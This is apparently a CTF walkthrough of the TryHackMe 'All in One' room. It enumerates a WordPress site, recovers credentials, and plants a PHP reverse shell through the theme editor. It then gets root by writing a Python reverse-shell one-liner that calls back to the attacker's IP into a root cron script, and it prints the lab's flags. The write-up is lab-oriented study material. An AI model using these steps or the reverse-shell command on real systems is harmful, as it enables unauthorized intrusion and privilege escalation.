# ALL IN ONE

## PortScanning
```sh
sudo python3 /home/bc-here/CTF/pymap.py -t all.thm >> ports.txt

[+] Port scanning...
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
[+] Enumerating open ports...

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.96.92
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)


PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)

```
## Ferox Buster
```sh
└─$ cat ferox.txt
404      GET        9l       31w      269c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter

403      GET        9l       28w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter

301      GET        9l       28w      306c http://all.thm/wordpress => http://all.thm/wordpress/

200      GET       15l       74w     6147c http://all.thm/icons/ubuntu-logo.png

200      GET      375l      964w    10918c http://all.thm/

301      GET        9l       28w      317c http://all.thm/wordpress/wp-content => http://all.thm/wordpress/wp-content/

500      GET        0l        0w        0c http://all.thm/wordpress/wp-includes/template-loader.php
.
.
.
.
.
.
.

```
- It gave me a huge amount of information about wordpress. It seems that I have to use wpscan

## WordPress Enumeration
- `10.10.42.81/wordpress/` this url give me a website which is built in wordpress.
- Lets Enumerate username from the website as we seen that there is a ssh server is open.

**Username Enumeration**
```sh
wpscan --url http://10.10.42.81/wordpress/ -e u
```
- From this command we found an username called `elyana`

**All Plugins Enumeration**
```sh
wpscan --url http://10.10.42.81/wordpress/ -e ap
```
- From this we found 2 plugins which are `mail-masta` and `reflex-gallery` 
```sh
[+] mail-masta
 | Location: http://10.10.42.81/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.42.81/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://10.10.42.81/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2021-03-10T02:38:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.42.81/wordpress/wp-content/plugins/reflex-gallery/readme.txt
```
1. `Mail-Masta`: This plugin has a `LFI`(local file inclusion) vulnerability
2. `Reflex-Gallery`: This plugin have `file upload` and `RCE` often led to php code execution.

## Directory Enumeration
```sh
gobuster dir -u http://10.10.42.81/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -o directory.txt
/wordpress           
/hackathons          
```

- Lets try with `/hackathons`!
- I Tried my web_commentScrapper
```sh
python3 /home/bc-here/CTF/THM/web_comment_extractor.py
Enter the website URL: http://10.10.42.81/hackathons
Comments found:


Dvc W@iyur@123
KeepGoing

```

- Lets try to decode this string.
- If we go to the webpage its show us `Damn how much I hate the smell of Vinegar :/ !!! `
    - It seems like it is `vigenere cipher decode`
    - Yes! it is . The Decode key is `keepGoing`

- `Dvc W@iyur@123` -> `Try H@ckme@123`

**We found the username:`elyana` password:`H@ckme@123`**
- I tried ssh login and failed. 

## Wordperss Login
- `http://10.10.42.81/wordpress/wp-login.php/`  I tried it and it requires uname and password
- I successfully get into the wordpress account.

### PHP reverse-shell
- Go to the link `http://10.10.42.81/wordpress/wp-admin/theme-editor.php`
- Chose 404 templete php
- Add your reverse-shell
- Change the ip to your openvpn Ip
- Save it and go to the link `10.10.42.81/wordpress/wp-content/themes/twentytwenty/404.php`
Yup!!! We get the shell!

## Getting UserFlag
```sh
$ cd elyana
$ ls
hint.txt
user.txt
$ cat user.txt
cat: user.txt: Permission denied
$ cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
$ find / -user elyana -type f 2>/dev/null
/home/elyana/user.txt
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt
$ cat /etc/mysql/conf.d/private.txt
user: elyana
password: E@syR18ght
```

- Lets use ssh with this creds
```sh
ssh elyana@10.10.42.81

-bash-4.4$ whoami
elyana
-bash-4.4$ cat user.txt
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
```
```sh
└─$ echo "VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259" | base64 -d
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
```
**UserFlag:`THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}`**

## Getting Root Flag
```sh
-bash-4.4$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /var/backups/script.sh

-bash-4.4$ cat /var/backups/script.sh
#!/bin/bash

#Just a test script, might use it later to for a cron task
-bash-4.4$ nano /var/backups/script.sh
-bash-4.4$ chmod +x /var/backups/script.sh
-bash-4.4$ .//var/backups/script.sh
-bash: .//var/backups/script.sh: No such file or directory
-bash-4.4$ .//var/backups/script.sh
-bash: .//var/backups/script.sh: No such file or directory
-bash-4.4$ ./var/backups/script.sh
-bash: ./var/backups/script.sh: No such file or directory
-bash-4.4$ ./var/backups/script.sh\
> ^C
-bash-4.4$ ./var/backups/script.sh\
> ^C
-bash-4.4$ ./var/backups/script.sh
-bash: ./var/backups/script.sh: No such file or directory
-bash-4.4$ cat /var/backups/script.sh
#!/bin/bash

#Just a test script, might use it later to for a cron task
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.96.92",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/AllInOne]
└─$ rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.11.96.92] from (UNKNOWN) [10.10.42.81] 59004
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# ls
root.txt
# cat ro
cat: ro: No such file or directory
# cat root.txt
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
```
```sh
└─$ echo "VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9" | base64 -d
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8
```

**RootFlag:`THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8`**